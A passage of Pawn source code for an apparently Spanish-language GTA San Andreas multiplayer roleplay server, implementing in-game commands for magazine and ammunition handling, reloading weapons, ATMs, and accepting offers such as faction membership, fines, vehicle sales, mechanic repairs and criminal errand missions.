			if(cantidad < 1){SendClientMessage(playerid, Rojo, "* La cantidad no puede ser nula o negativa."); return 1;}
			if(cantidad > PlayerInfo[playerid][pManoIzqCant]){SendClientMessage(playerid, Rojo, "* No te queda tanta munición en la caja."); return 1;}
			if(PlayerInfo[playerid][pManoDerCant] + cantidad >= ObjetoInfo[ManoDer][Capacidad]) //Si la cantidad + el cargador es mayor a su capacidad
			{
			    format(string, sizeof(string), "* Has rellenado tu {fce80c}%s{FFFFFF} con {fce80c}%d %s{FFFFFF}.", ObjetoInfo[ManoDer][NombreObjeto], ObjetoInfo[ManoDer][Capacidad] - PlayerInfo[playerid][pManoDerCant], ObjetoInfo[ManoIzq][NombreObjeto]);
				SendClientMessage(playerid, Blanco, string);
				PlayerInfo[playerid][pManoIzqCant] -= ObjetoInfo[ManoDer][Capacidad] - PlayerInfo[playerid][pManoDerCant];
			    PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[ManoDer][Capacidad];
				return 1;
   			}
			PlayerInfo[playerid][pManoIzqCant] -= cantidad;
			PlayerInfo[playerid][pManoDerCant] += cantidad;
			format(string, sizeof(string), "* Has metido {fce80c}%d %s {FFFFFF}en tu {fce80c}%s (%d){FFFFFF}.", cantidad, ObjetoInfo[ManoIzq][NombreObjeto], ObjetoInfo[ManoDer][NombreObjeto], PlayerInfo[playerid][pManoDerCant]);
			SendClientMessage(playerid, Blanco, string);
	    }
	    else{SendClientMessage(playerid, Rojo, "* El cargador y la munición no son del mismo tipo.");}
	    return 1;
	}
	if(strcmp(opcion,"vaciar",true) == 0)
	{
        new ManoDer = PlayerInfo[playerid][pManoDer], ManoIzq = PlayerInfo[playerid][pManoIzq];
	    if(GetPlayerCargadorCalibre(playerid, 2)) //Tiene cargador en mano izquierda
	    {
	        tmp = strtok(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, Naranja, "* /Cargador Vaciar [Cantidad]");
				return 1;
			}
			new cantidad = strval(tmp);
			if(cantidad < 1){SendClientMessage(playerid, Rojo, "* La cantidad no puede ser nula o negativa."); return 1;}
			if(cantidad > PlayerInfo[playerid][pManoIzqCant]){SendClientMessage(playerid, Rojo, "* No te queda tanta munición en el cargador."); return 1;}
			if(GetPlayerMunicionCalibre(playerid, 1) && PlayerInfo[playerid][pManoDerCant] >= ObjetoInfo[ManoDer][Capacidad]){SendClientMessage(playerid, Rojo, "* La caja de munición ya está a su máxima capacidad."); return 1;}
			if(GetPlayerMunicionCalibre(playerid, 1) && GetPlayerCargadorCalibre(playerid, 2) != GetPlayerMunicionCalibre(playerid, 1)){SendClientMessage(playerid, Rojo, "* La munición del cargador no es la misma que la de esta caja de munición."); return 1;}
			if(!GetPlayerMunicionCalibre(playerid, 1) && PlayerInfo[playerid][pManoDer] > 0){SendClientMessage(playerid, Rojo, "* No puedes meter balas en este objeto."); return 1;}

			if(GetPlayerCargadorCalibre(playerid, 2) == GetPlayerMunicionCalibre(playerid, 1)) //Ya tiene caja de munición en la otra mano
	        {
	            if(PlayerInfo[playerid][pManoDerCant] + cantidad >= ObjetoInfo[ManoDer][Capacidad]) //La cantidad que saca es mayor a la capacidad de la caja
	            {
	                cantidad = ObjetoInfo[ManoDer][Capacidad] - PlayerInfo[playerid][pManoDerCant];
	                PlayerInfo[playerid][pManoIzqCant] -= cantidad;
					PlayerInfo[playerid][pManoDerCant] += cantidad;
					format(string, sizeof(string), "* Has sacado {fce80c}%d %s {FFFFFF}de tu {fce80c}%s (%d){FFFFFF}.", cantidad, ObjetoInfo[ManoDer][NombreObjeto], ObjetoInfo[ManoIzq][NombreObjeto], PlayerInfo[playerid][pManoIzqCant]);
					SendClientMessage(playerid, Blanco, string);
					return 1;
	            }
	            PlayerInfo[playerid][pManoIzqCant] -= cantidad;
				PlayerInfo[playerid][pManoDerCant] += cantidad;
				format(string, sizeof(string), "* Has sacado {fce80c}%d %s {FFFFFF}de tu {fce80c}%s (%d){FFFFFF}.", cantidad, ObjetoInfo[ManoDer][NombreObjeto], ObjetoInfo[ManoIzq][NombreObjeto], PlayerInfo[playerid][pManoIzqCant]);
				SendClientMessage(playerid, Blanco, string);
				return 1;
	        }
	        
	        new caja;
	        switch(GetPlayerCargadorCalibre(playerid, 2))
	        {
	            case 1: caja = 47; //M1911 (.45 ACP)
	            case 2: caja = 48; //D.Eagle (.50 AE)
	            case 3: caja = 49; //UZI MP5 Tec9 (9mm)
	            case 5: caja = 51; //Ak47
	            case 6: caja = 52; //M4
	            case 7: caja = 53; //Rifle
	        }
	        PlayerInfo[playerid][pManoIzqCant] -= cantidad;
		    PlayerInfo[playerid][pManoDer] = caja;
			PlayerInfo[playerid][pManoDerCant] += cantidad;
			PonerObjeto(playerid, 1, caja);
			format(string, sizeof(string), "* Has sacado {fce80c}%d %s {FFFFFF}de tu {fce80c}%s (%d){FFFFFF}.", cantidad, ObjetoInfo[caja][NombreObjeto], ObjetoInfo[ManoIzq][NombreObjeto], PlayerInfo[playerid][pManoIzqCant]);
			SendClientMessage(playerid, Blanco, string);
	    }
	    else if(GetPlayerCargadorCalibre(playerid, 1)) // //Tiene cargador en mano derecha
	    {
	        tmp = strtok(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, Naranja, "* /Cargador Vaciar [Cantidad]");
				return 1;
			}
			new cantidad = strval(tmp);
			if(cantidad < 1){SendClientMessage(playerid, Rojo, "* La cantidad no puede ser nula o negativa."); return 1;}
			if(cantidad > PlayerInfo[playerid][pManoDerCant]){SendClientMessage(playerid, Rojo, "* No te queda tanta munición en el cargador."); return 1;}
			if(GetPlayerMunicionCalibre(playerid, 2) && PlayerInfo[playerid][pManoIzqCant] >= ObjetoInfo[ManoIzq][Capacidad]){SendClientMessage(playerid, Rojo, "* La caja de munición ya está a su máxima capacidad."); return 1;}
			if(GetPlayerMunicionCalibre(playerid, 2) && GetPlayerCargadorCalibre(playerid, 1) != GetPlayerMunicionCalibre(playerid, 2)){SendClientMessage(playerid, Rojo, "* La munición del cargador no es la misma que la de esta caja de munición."); return 1;}
			if(!GetPlayerMunicionCalibre(playerid, 2) && PlayerInfo[playerid][pManoIzq] > 0){SendClientMessage(playerid, Rojo, "* No puedes meter balas en este objeto."); return 1;}

			if(GetPlayerCargadorCalibre(playerid, 1) == GetPlayerMunicionCalibre(playerid, 2)) //Ya tiene caja de munición en la otra mano
	        {
	            if(PlayerInfo[playerid][pManoIzqCant] + cantidad >= ObjetoInfo[ManoIzq][Capacidad]) //La cantidad que saca es mayor a la capacidad de la caja
	            {
	                cantidad = ObjetoInfo[ManoIzq][Capacidad] - PlayerInfo[playerid][pManoIzqCant];
	                PlayerInfo[playerid][pManoDerCant] -= cantidad;
					PlayerInfo[playerid][pManoIzqCant] += cantidad;
					format(string, sizeof(string), "* Has sacado {fce80c}%d %s {FFFFFF}de tu {fce80c}%s (%d){FFFFFF}.", cantidad, ObjetoInfo[ManoIzq][NombreObjeto], ObjetoInfo[ManoDer][NombreObjeto], PlayerInfo[playerid][pManoDerCant]);
					SendClientMessage(playerid, Blanco, string);
					return 1;
	            }
	            PlayerInfo[playerid][pManoDerCant] -= cantidad;
				PlayerInfo[playerid][pManoIzqCant] += cantidad;
				format(string, sizeof(string), "* Has sacado {fce80c}%d %s {FFFFFF}de tu {fce80c}%s (%d){FFFFFF}.", cantidad, ObjetoInfo[ManoIzq][NombreObjeto], ObjetoInfo[ManoDer][NombreObjeto], PlayerInfo[playerid][pManoDerCant]);
				SendClientMessage(playerid, Blanco, string);
				return 1;
	        }

	        new caja;
	        switch(GetPlayerCargadorCalibre(playerid, 1))
	        {
	            case 1: caja = 47; //M1911 (.45 ACP)
	            case 2: caja = 48; //D.Eagle (.50 AE)
	            case 3: caja = 49; //UZI MP5 Tec9 (9mm)
	            case 5: caja = 51; //Ak47
	            case 6: caja = 52; //M4
	            case 7: caja = 53; //Rifle
	        }
	        PlayerInfo[playerid][pManoDerCant] -= cantidad;
		    PlayerInfo[playerid][pManoIzq] = caja;
			PlayerInfo[playerid][pManoIzqCant] += cantidad;
			PonerObjeto(playerid, 2, caja);
			format(string, sizeof(string), "* Has sacado {fce80c}%d %s {FFFFFF}de tu {fce80c}%s (%d){FFFFFF}.", cantidad, ObjetoInfo[caja][NombreObjeto], ObjetoInfo[ManoDer][NombreObjeto], PlayerInfo[playerid][pManoDerCant]);
			SendClientMessage(playerid, Blanco, string);
	    }
	    return 1;
	}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd,"/recargar",true) == 0 || strcmp(cmd,"/rec",true) == 0) //Recarga un arma
{
	if(RecargarTiempo[playerid] == 1){SendClientMessage(playerid, Rojo, "* Espera 3 segundos antes de volver a recargar."); return 1;}
	new ManoDer = PlayerInfo[playerid][pManoDer], ArmaID = ObjetoInfo[ManoDer][IDArma];
    if(ArmaID == 0){SendClientMessage(playerid, Rojo, "* No sujetas ningún arma con tu mano derecha."); return 1;}
    if(ObjetoInfo[ManoDer][Capacidad] == 1 /*&& ManoDer != 38*/){SendClientMessage(playerid, Rojo, "* Este arma no se puede recargar."); return 1;}
    new Cargador;
    switch(ArmaID)
    {
        case 22: Cargador = 39;
        case 23: Cargador = 39;
		case 24: Cargador = 40;
		case 25: Cargador = 50;
		case 26: Cargador = 50;
		case 27: Cargador = 50;
		case 28: Cargador = 41;
		case 29: Cargador = 42;
		case 30: Cargador = 44;
		case 31: Cargador = 45;
		case 32: Cargador = 43;
		case 33: Cargador = 46;
		case 34: Cargador = 46;
    }
    new TieneCargador, Bol;
    if(PlayerInfo[playerid][pServicioPD] == 0)
	{
	    for(new x = 0; x < 8; x++)
    	{
    		if(PlayerInfo[playerid][pBol][x] == Cargador && PlayerInfo[playerid][pBolCant][x] > 0)
			{
				TieneCargador = 1;
      	 	 	Bol = x;
				break;
			}
		}
	}
	if(PlayerInfo[playerid][pServicioPD] > 0)
	{
		for(new x = 0; x < 8; x++)
    	{
			if(PlayerInfo[playerid][pCint][x] == Cargador && PlayerInfo[playerid][pCintCant][x] > 0)
			{
				TieneCargador = 1;
        		Bol = x;
				break;
			}
		}
	}
    if(TieneCargador == 0){SendClientMessage(playerid, Rojo, "* No te queda munición para este arma."); return 1;}
    new BolCant;
    if(PlayerInfo[playerid][pServicioPD] == 0){BolCant = PlayerInfo[playerid][pBolCant][Bol];}
    if(PlayerInfo[playerid][pServicioPD] > 0){BolCant = PlayerInfo[playerid][pCintCant][Bol];}
    new Muni = GetPlayerWeaponAmmo(playerid, ArmaID);
    if(ArmaID != 25 && ArmaID != 26 && ArmaID != 27)
    {
		ResetPlayerWeapons(playerid);
	    GivePlayerWeapon(playerid, ArmaID, BolCant);
	 	if(PlayerInfo[playerid][pServicioPD] == 0){PlayerInfo[playerid][pBolCant][Bol] = Muni;}
	 	if(PlayerInfo[playerid][pServicioPD] > 0){PlayerInfo[playerid][pCintCant][Bol] = Muni;}
 	}
 	else
 	{
 	    new n;
 	    switch(ArmaID)
 	    {
 	        case 25: n = 4;
 	        case 26: n = 2;
 	        case 27: n = 7;
 	    }
 	    if(GetPlayerWeaponAmmo(playerid, ArmaID) >= n){SendClientMessage(playerid, Rojo, "* No necesitas recargar este arma."); return 1;}
 	    new Municion = (n - GetPlayerWeaponAmmo(playerid, ArmaID));
 	    for(new a = 0; a < Municion; a++)
 	    {
 	    	if(PlayerInfo[playerid][pServicioPD] == 0)
			{
 	        	if(PlayerInfo[playerid][pBolCant][Bol] == 0){break;}
 	    		GivePlayerWeapon(playerid, ArmaID, 1);
 	    		PlayerInfo[playerid][pBolCant][Bol] --;
 	    	}
 	    	if(PlayerInfo[playerid][pServicioPD] > 0)
			{
				if(PlayerInfo[playerid][pCintCant][Bol] == 0){break;}
 	    		GivePlayerWeapon(playerid, ArmaID, 1);
 	    		PlayerInfo[playerid][pCintCant][Bol] --;
			}
 	    }
 	}
 	format(string, sizeof(string), "* %s recarga su arma.", GetPlayerNameRP(playerid));
    ProxDetector(5.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
    RecargarTiempo[playerid] = 1;
    SetTimerEx("RecargarTimer", 3000, false, "i", playerid);
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd,"/atm",true) == 0) //Ver comandos de un cajero
{
    if(!GetPlayerCajero(playerid)){SendClientMessage(playerid, Rojo, "* No estás en un cajero automático."); return 1;}
    MostrarATM(playerid, 1);
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/aceptar", true) == 0) //Aceptar proposiciones
{
    new opcion[60];
	opcion = strtok(cmdtext, idx);
	if(!strlen(opcion))
	{
	    SendClientMessage(playerid, Naranja, "* /Aceptar [Opción]");
	    SendClientMessage(playerid, Naranja, "Faccion, Multa, CompraVeh, Reparacion, Repintado, Contrato, Mision, Saludo, Llave");
	    return 1;
	}
	if(strcmp(opcion,"faccion",true) == 0)
	{
		if(reclutarfaccion[playerid] == 0){SendClientMessage(playerid, Rojo, "* Nadie te ha ofrecido formar parte de su facción."); return 1;}
		if(!GetPlayersProx(5.0, playerid, reclutarlider[playerid])){SendClientMessage(playerid, Rojo, "* Demasiado lejos."); reclutarlider[playerid] = 0, reclutarfaccion[playerid] = 0; return 1;}
		PlayerInfo[playerid][pFaccion] = reclutarfaccion[playerid];
		PlayerInfo[playerid][pRango] = 1;
		format(string, sizeof(string), "* Ahora formas parte de la facción #%d.", reclutarfaccion[playerid]);
	    SendClientMessage(playerid, Amarillo, string);
	    format(string, sizeof(string), "* %s forma ahora parte de tu facción.", GetPlayerNameRP(playerid));
	    SendClientMessage(reclutarlider[playerid], Amarillo, string);
	    reclutarfaccion[playerid] = 0;
	    reclutarlider[playerid] = NOEXISTE;
	    return 1;
	}
	if(strcmp(opcion,"multa",true) == 0)
	{
	    if(MultaPrecio[playerid] == 0 || Multador[playerid] == NOEXISTE){SendClientMessage(playerid, Rojo, "* Nadie te ha entregado una multa."); return 1;}
	    if(!GetPlayersProx(5.0, playerid, Multador[playerid])){SendClientMessage(playerid, Rojo, "* Demasiado lejos."); Multador[playerid] = -1, MultaPrecio[playerid] = 0; return 1;}
		PlayerInfo[playerid][pDineroBanco] -= MultaPrecio[playerid];
		new Recibo = (5*MultaPrecio[playerid]/100);
		if(Recibo < 1)Recibo = 0;
		PlayerInfo[Multador[playerid]][pDineroBanco] += Recibo;
		format(string, sizeof(string), "* Has pagado tu multa de %d$ a %s. El dinero se te descontará del banco", MultaPrecio[playerid], GetPlayerNameRP(Multador[playerid]));
		SendClientMessage(playerid, Amarillo, string);
		format(string, sizeof(string), "* %s ha pagado su multa de %d$. Recibes una parte de %d$ en el banco.", GetPlayerNameRP(playerid), MultaPrecio[playerid], Recibo);
		SendClientMessage(Multador[playerid], Amarillo, string);
		Multador[playerid] = NOEXISTE;
		MultaPrecio[playerid] = 0;
	    return 1;
	}
	if(strcmp(opcion,"compraveh",true) == 0)
	{
	    if(VenderVehAVendedor[playerid] == NOEXISTE){SendClientMessage(playerid, Rojo, "* Nadie te ha ofrecido comprar un vehículo."); return 1;}
		if(GetPlayerMoney(playerid) < VenderVehAPrecio[playerid]){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero en mano."); return 1;}
		if(!GetPlayersProx(5.0, playerid, VenderVehAVendedor[playerid])){SendClientMessage(playerid, Rojo, "* Demasiado lejos."); VenderVehAVendedor[playerid] = NOEXISTE; return 1;}
		new EsPropietario;
		for(new x; x < 5; x++)
		{
			if(PlayerInfo[VenderVehAVendedor[playerid]][pLlaveCoche][x] == VenderVehALlave[playerid])
			{
				EsPropietario = 1;
				break;
			}
		}
		if(!EsPropietario){SendClientMessage(playerid, Rojo, "* La oferta ha expirado."); return 1;}
		GivePlayerMoneyAC(playerid, -VenderVehAPrecio[playerid]);
		GivePlayerMoneyAC(VenderVehAVendedor[playerid], VenderVehAPrecio[playerid]);
		format(string, sizeof(string), "* Has comprado un vehículo a %s por %d$.", GetPlayerNameRP(VenderVehAVendedor[playerid]), VenderVehAPrecio[playerid]);
		SendClientMessage(playerid, Verde, string);
		format(string, sizeof(string), "* %s te ha comprado tu vehículo por %d$.", GetPlayerNameRP(playerid), VenderVehAPrecio[playerid]);
		SendClientMessage(VenderVehAVendedor[playerid], Verde, string);
		printf("%s ha vendido un vehículo (LS-%d) a %s por %d.", GetPlayerNameRP(VenderVehAVendedor[playerid]), VenderVehALlave[playerid], GetPlayerNameRP(playerid), VenderVehAPrecio[playerid]);
		format(string, sizeof(string), "* %s vende un vehículo a %s y le entrega los papeles.", GetPlayerNameRP(VenderVehAVendedor[playerid]), GetPlayerNameRP(playerid));
 	    ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
		for(new x; x < 5; x++)
		{
			if(PlayerInfo[playerid][pLlaveCoche][x] == 0)
			{
				PlayerInfo[playerid][pLlaveCoche][x] = VenderVehALlave[playerid];
				break;
			}
		}
		for(new x; x < 5; x++)
		{
			if(PlayerInfo[VenderVehAVendedor[playerid]][pLlaveCoche][x] == VenderVehALlave[playerid])
			{
				PlayerInfo[VenderVehAVendedor[playerid]][pLlaveCoche][x] = 0;
				break;
			}
		}
		RemovePlayerFromVehicle(VenderVehAVendedor[playerid]);
		return 1;
	}
	if(strcmp(opcion,"reparacion",true) == 0)
	{
        if(ReparacionTipo[playerid] == 0 || ReparacionMeca[playerid] == NOEXISTE){SendClientMessage(playerid, Rojo, "* Nadie te ha ofrecido una reparación."); return 1;}
		if(!GetPlayersProx(5.0, playerid, ReparacionMeca[playerid])){SendClientMessage(playerid, Rojo, "* Demasiado lejos."); ReparacionMeca[playerid] = NOEXISTE; ReparacionTipo[playerid] = 0; ReparacionPrecio[playerid] = 0; return 1;}
		if(!GetPlayerTaller(playerid)){SendClientMessage(playerid, Rojo, "* No estás en un taller."); ReparacionMeca[playerid] = NOEXISTE, ReparacionTipo[playerid] = 0; ReparacionPrecio[playerid] = 0; return 1;}
		if(GetPlayerMoney(playerid) < ReparacionPrecio[playerid]){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); ReparacionMeca[playerid] = NOEXISTE, ReparacionTipo[playerid] = 0; ReparacionPrecio[playerid] = 0; return 1;}
		if(ReparacionTipo[playerid] == 1) //Motor
		{
			new mecanico = ReparacionMeca[playerid], precio = ReparacionPrecio[playerid], coche = GetPlayerVehicleID(playerid);
			format(string, sizeof(string), "Has aceptado la reparación del motor de %s por %d$. Espera a que se repare.", GetPlayerNameRP(mecanico), precio);
			SendClientMessage(playerid, Amarillo, string);
			format(string, sizeof(string), "%s ha aceptado tu reparación del motor por %d$.", GetPlayerNameRP(playerid), precio);
			SendClientMessage(mecanico, Amarillo, string);
			format(string, sizeof(string), "* %s comienza a repararle el motor a %s.", GetPlayerNameRP(mecanico), GetPlayerNameRP(playerid));
 	    	ProxDetector(15.0, mecanico, string,Morado,Morado,Morado,Morado,Morado);
 	    	TogglePlayerControllable(playerid, 0);
			SetTimerEx("Descongelar", 20000, false, "i", playerid);
			GameTextForPlayer(playerid, "~g~Reparando motor", 20000, 3);
			SetTimerEx("RepararMeca", 20000, false, "i d d", playerid, ReparacionTipo[playerid], coche);
			GivePlayerMoneyAC(playerid, -precio);
			GivePlayerMoneyAC(mecanico, precio-30);
			if(GetPlayerTaller(mecanico) == PlayerInfo[mecanico][pTaller]){NegoInfo[PlayerInfo[mecanico][pTaller]][nDineroGuardado] += 30;}
			PlayerInfo[mecanico][pHabMec] ++;
			ReparacionTipo[playerid] = 0;
			ReparacionMeca[playerid] = NOEXISTE;
			ReparacionPrecio[playerid] = 0;
			SiendoReparado[playerid] = 1;
			return 1;
		}
		if(ReparacionTipo[playerid] == 2) //Carrocería
		{
			new mecanico = ReparacionMeca[playerid], precio = ReparacionPrecio[playerid], coche = GetPlayerVehicleID(playerid);
			format(string, sizeof(string), "Has aceptado la reparación de la carrocería de %s por %d$. Espera a que se repare.", GetPlayerNameRP(mecanico), precio);
			SendClientMessage(playerid, Amarillo, string);
			format(string, sizeof(string), "%s ha aceptado tu reparación de la carrocería por %d$.", GetPlayerNameRP(playerid), precio);
			SendClientMessage(mecanico, Amarillo, string);
			format(string, sizeof(string), "* %s comienza a repararle la carrocería a %s.", GetPlayerNameRP(mecanico), GetPlayerNameRP(playerid));
 	    	ProxDetector(15.0, mecanico, string,Morado,Morado,Morado,Morado,Morado);
 	    	TogglePlayerControllable(playerid, 0);
			SetTimerEx("Descongelar", 30000, false, "i", playerid);
			GameTextForPlayer(playerid, "~g~Reparando carroceria", 30000, 3);
			SetTimerEx("RepararMeca", 30000, false, "i d d", playerid, ReparacionTipo[playerid], coche);
			GivePlayerMoneyAC(playerid, -precio);
			GivePlayerMoneyAC(mecanico, precio-30);
			if(GetPlayerTaller(mecanico) == PlayerInfo[mecanico][pTaller]){NegoInfo[PlayerInfo[mecanico][pTaller]][nDineroGuardado] += 30;}
			PlayerInfo[mecanico][pHabMec] ++;
			ReparacionTipo[playerid] = 0;
			ReparacionMeca[playerid] = NOEXISTE;
			ReparacionPrecio[playerid] = 0;
			SiendoReparado[playerid] = 1;
			return 1;
		}
		if(ReparacionTipo[playerid] == 3) //Ruedas
		{
			new mecanico = ReparacionMeca[playerid], precio = ReparacionPrecio[playerid], coche = GetPlayerVehicleID(playerid);
			format(string, sizeof(string), "Has aceptado la reparación de las ruedas de %s por %d$. Espera a que se repare.", GetPlayerNameRP(mecanico), precio);
			SendClientMessage(playerid, Amarillo, string);
			format(string, sizeof(string), "%s ha aceptado tu reparación de las ruedas por %d$.", GetPlayerNameRP(playerid), precio);
			SendClientMessage(mecanico, Amarillo, string);
			format(string, sizeof(string), "* %s comienza a repararle las ruedas a %s.", GetPlayerNameRP(mecanico), GetPlayerNameRP(playerid));
 	    	ProxDetector(15.0, mecanico, string,Morado,Morado,Morado,Morado,Morado);
 	    	TogglePlayerControllable(playerid, 0);
			SetTimerEx("Descongelar", 15000, false, "i", playerid);
			GameTextForPlayer(playerid, "~g~Reparando ruedas", 15000, 3);
			SetTimerEx("RepararMeca", 15000, false, "i d d", playerid, ReparacionTipo[playerid], coche);
			GivePlayerMoneyAC(playerid, -precio);
			GivePlayerMoneyAC(mecanico, precio-30);
			if(GetPlayerTaller(mecanico) == PlayerInfo[mecanico][pTaller]){NegoInfo[PlayerInfo[mecanico][pTaller]][nDineroGuardado] += 30;}
			PlayerInfo[mecanico][pHabMec] ++;
			ReparacionTipo[playerid] = 0;
			ReparacionMeca[playerid] = NOEXISTE;
			ReparacionPrecio[playerid] = 0;
			SiendoReparado[playerid] = 1;
			return 1;
		}
	}
	if(strcmp(opcion,"repintado",true) == 0)
	{
	    if(RepintadoMeca[playerid] == NOEXISTE){SendClientMessage(playerid, Rojo, "* Nadie te ha ofrecido una repintar tu vehículo."); return 1;}
		if(!GetPlayersProx(5.0, playerid, RepintadoMeca[playerid])){SendClientMessage(playerid, Rojo, "* Demasiado lejos."); RepintadoMeca[playerid] = NOEXISTE; RepintadoColor1[playerid] = 0; RepintadoColor2[playerid] = 0; RepintadoPrecio[playerid] = 0; return 1;}
		if(!GetPlayerTaller(playerid)){SendClientMessage(playerid, Rojo, "* No estás en un taller."); RepintadoMeca[playerid] = NOEXISTE, RepintadoColor1[playerid] = 0; RepintadoColor2[playerid] = 0; RepintadoPrecio[playerid] = 0; return 1;}
		if(GetPlayerMoney(playerid) < RepintadoPrecio[playerid]){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); RepintadoMeca[playerid] = NOEXISTE, RepintadoColor1[playerid] = 0; RepintadoColor2[playerid] = 0; RepintadoPrecio[playerid] = 0; return 1;}
		new mecanico = RepintadoMeca[playerid], precio = RepintadoPrecio[playerid], color1 = RepintadoColor1[playerid], color2 = RepintadoColor2[playerid], coche = GetPlayerVehicleID(playerid);
		format(string, sizeof(string), "Has aceptado el repintado de %s por %d$.", GetPlayerNameRP(mecanico), precio);
		SendClientMessage(playerid, Amarillo, string);
		format(string, sizeof(string), "%s ha aceptado tu repintado por %d$.", GetPlayerNameRP(playerid), precio);
		SendClientMessage(mecanico, Amarillo, string);
		format(string, sizeof(string), "* %s comienza a repintarle el vehículo a %s.", GetPlayerNameRP(mecanico), GetPlayerNameRP(playerid));
    	ProxDetector(15.0, mecanico, string,Morado,Morado,Morado,Morado,Morado);
    	TogglePlayerControllable(playerid, 0);
    	SetTimerEx("Descongelar", 15000, false, "i", playerid);
		GameTextForPlayer(playerid, "~g~Repintando vehiculo", 15000, 3);
		SetTimerEx("RepintarMeca", 15000, false, "i d d d", playerid, color1, color2, coche);
    	GivePlayerMoneyAC(playerid, -precio);
		GivePlayerMoneyAC(mecanico, precio-200);
		if(GetPlayerTaller(mecanico) == PlayerInfo[mecanico][pTaller]){NegoInfo[PlayerInfo[mecanico][pTaller]][nDineroGuardado] += 200;}
		PlayerInfo[mecanico][pHabMec] ++;
		RepintadoColor1[playerid] = 0;
		RepintadoColor2[playerid] = 0;
		RepintadoMeca[playerid] = NOEXISTE;
		RepintadoPrecio[playerid] = 0;
		return 1;
	}
	if(strcmp(opcion,"contrato",true) == 0)
	{
	    if(Contratador[playerid] == NOEXISTE){SendClientMessage(playerid, Rojo, "* Nadie te ha ofrecido un contrato."); return 1;}
		if(!GetPlayersProx(5.0, playerid, Contratador[playerid])){SendClientMessage(playerid, Rojo, "* Demasiado lejos."); Contratador[playerid] = NOEXISTE; Contrato[playerid] = 0; return 1;}
		if(Contrato[playerid] == 6) //Taller mecánico
		{
		    if(PlayerInfo[playerid][pTrabajo] != 7){SendClientMessage(playerid, Rojo, "* No eres mecánico."); return 1;}
		    PlayerInfo[playerid][pTaller] = PlayerInfo[Contratador[playerid]][pNegocio];
		    format(string, sizeof(string), "Ahora trabajas de mecánico en el taller de %s. Puedes renunciar a ello con '/Renunciar'.", GetPlayerNameRP(Contratador[playerid]));
		    SendClientMessage(playerid, Amarillo, string);
		    format(string, sizeof(string), "%s trabaja ahora de mecánico en tu taller. Puedes despedirlo con '/Despedir'.", GetPlayerNameRP(playerid));
		    SendClientMessage(Contratador[playerid], Amarillo, string);
		    Contratador[playerid] = NOEXISTE;
		    Contrato[playerid] = 0;
		    return 1;
		}
	}
	if(strcmp(opcion,"mision",true) == 0)
	{
	    if(RealizandoMision[playerid] != 0){SendClientMessage(playerid, Rojo, "* Ya estás en un recado."); return 1;}
		if(MisionEncargada[playerid] == 0){SendClientMessage(playerid, Rojo, "* Nadie te ha encargado un recado."); return 1;}
		if(MisionEncargada[playerid] == 1) //Misión conseguir droga
		{
		    SendClientMessage(playerid, Amarillo, "SMS de Nº oculto: La poli va a venir a husmear a mi casa.");
		    SendClientMessage(playerid, Amarillo, "SMS de Nº oculto: Necesito que te lleves una cosa que no he conseguido vender.");
            MisionEncargada[playerid] = 0;
			RealizandoMision[playerid] = 1;
			new rand, bucles;
			for(new x=1; x<=TotalTurfs; x++)
			{
			    rand = random(2);
			    if(TurfInfo[x][tFaccion] == PlayerInfo[playerid][pFaccion] && rand)
			    {
			        SetPlayerCheckpoint(playerid, TurfInfo[x][tDistrbuirDrogaX], TurfInfo[x][tDistrbuirDrogaY], TurfInfo[x][tDistrbuirDrogaZ], 0.5);
			        break;
			    }
			    if(x == TotalTurfs) x = 1, bucles++; //Reinicia el bucle
			    if(bucles >= 3) break;
			}
			return 1;
		}
		else if(MisionEncargada[playerid] == 2) //Misión conseguir arma
		{
		    SendClientMessage(playerid, Amarillo, "SMS de Nº oculto: Tuve problemas con un payaso y lo mandé de viaje.");
		    SendClientMessage(playerid, Amarillo, "SMS de Nº oculto: La poli está husmeando, necesito que escondas algo un tiempo.");
		    MisionEncargada[playerid] = 0;
		    RealizandoMision[playerid] = 2;
		    new rand, bucles;
			for(new x=1; x<=TotalTurfs; x++)
			{
			    rand = random(2);
			    if(TurfInfo[x][tFaccion] == PlayerInfo[playerid][pFaccion] && rand)
			    {
			        SetPlayerCheckpoint(playerid, TurfInfo[x][tDistrbuirDrogaX], TurfInfo[x][tDistrbuirDrogaY], TurfInfo[x][tDistrbuirDrogaZ], 0.5);
			        break;
			    }
			    if(x == TotalTurfs) x = 1, bucles++; //Reinicia el bucle
			    if(bucles >= 5) break;
			}
			return 1;
		}
		else if(MisionEncargada[playerid] == 3) //Misión pintar
		{
		    SendClientMessage(playerid, Amarillo, "SMS de Nº oculto: Tenemos que darnos a conocer en la ciudad.");
		    SendClientMessage(playerid, Amarillo, "SMS de Nº oculto: Pilla unos sprays y haz una buena pintada para que sepan quién manda aquí.");
		    MisionEncargada[playerid] = 0;
		    RealizandoMision[playerid] = 3;
		    new rand = random(MAX_LUGARESPINTAR);
		    MuroAPintar[playerid] = rand;
		    SetPlayerCheckpoint(playerid, LugaresPintar[rand][GraffitiX], LugaresPintar[rand][GraffitiY], LugaresPintar[rand][GraffitiZ], 2.0);
		}
	}
	if(strcmp(opcion,"saludo",true) == 0)
	{
	    if(ofertasaludo[idsaludado] != NOEXISTE)
		{
			new seleccion;
			seleccion = saludoid;
			ApplyAnimation(playerid,animsaludo[seleccion][animliba],animsaludo[seleccion][animnamea],4.0,0,0,0,3000,1,1);
			ApplyAnimation(ofertasaludo[playerid],animsaludo[seleccion][animliba],animsaludo[seleccion][animnamea],4.0,0,0,0,3000,1,1);
			ofertasaludo[idsaludado] = NOEXISTE;
		}
		else
		{
			SendClientMessage(playerid,RojoIntenso,"Nadie te ofreció un saludo");
			return 1;
		}
	}
	if(strcmp(opcion,"llave",true) == 0)
	{
	    if(PrestadorCoche[playerid] == NOEXISTE || LlavePrestada[playerid] == NOEXISTE)
		{
		    PrestadorCoche[playerid] = NOEXISTE;
    		LlavePrestada[playerid] = NOEXISTE;
			SendClientMessage(playerid,Rojo,"* Nadie te ha ofrecido prestarte la llave de su vehículo.");
			return 1;
		}
